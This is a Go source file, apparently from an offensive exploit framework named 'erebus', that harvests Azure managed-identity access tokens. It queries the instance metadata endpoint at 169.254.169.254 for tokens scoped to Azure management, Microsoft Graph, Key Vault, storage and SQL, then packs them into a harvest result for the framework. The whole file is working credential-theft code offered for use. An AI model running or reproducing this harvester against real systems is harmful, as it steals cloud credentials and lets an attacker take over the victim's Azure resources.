package cloud

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

// harvestManagedIdentity enumerates Azure Managed Identity tokens for multiple resources.
// Only works on Azure VMs/App Services/Functions with Managed Identity enabled.
// Cross-platform.
func harvestManagedIdentity(ctx context.Context) *pb.CloudHarvestResult {
	result := &pb.CloudHarvestResult{
		Provider: "azure",
		Method:   "managed_identity",
	}

	client := &http.Client{Timeout: 5 * time.Second}

	// Common Azure resource URIs to enumerate
	resources := []string{
		"https://management.azure.com/",
		"https://graph.microsoft.com/",
		"https://vault.azure.net",
		"https://storage.azure.com/",
		"https://database.windows.net/",
		"https://graph.windows.net/",
	}

	// M2: Probe once first to detect managed identity before full enumeration
	// Try the management resource first — if this fails, skip all others
	probeToken, err := getManagedIdentityToken(ctx, client, resources[0])
	if err != nil {
		return nil
	}
	result.Tokens = append(result.Tokens, probeToken)

	found := true
	for _, resource := range resources[1:] {
		token, err := getManagedIdentityToken(ctx, client, resource)
		if err != nil {
			continue
		}
		result.Tokens = append(result.Tokens, token)
	}

	if !found {
		return nil
	}
	return result
}

type managedIdentityResponse struct {
	AccessToken  string `json:"access_token"`
	ExpiresIn    string `json:"expires_in"`
	ExpiresOn    string `json:"expires_on"`
	Resource     string `json:"resource"`
	TokenType    string `json:"token_type"`
	ClientID     string `json:"client_id"`
}

func getManagedIdentityToken(ctx context.Context, client *http.Client, resource string) (*pb.CloudToken, error) {
	url := fmt.Sprintf(
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=%s",
		resource,
	)

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Metadata", "true")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("managed identity token request failed: %d", resp.StatusCode)
	}

	var tokenResp managedIdentityResponse
	if err := json.NewDecoder(resp.Body).Decode(&tokenResp); err != nil {
		return nil, err
	}

	return &pb.CloudToken{
		Provider:    "azure",
		TokenType:   "managed_identity",
		AccessToken: tokenResp.AccessToken,
		ClientId:    tokenResp.ClientID,
		Resource:    tokenResp.Resource,
		Source:      "managed_identity_imds",
	}, nil
}
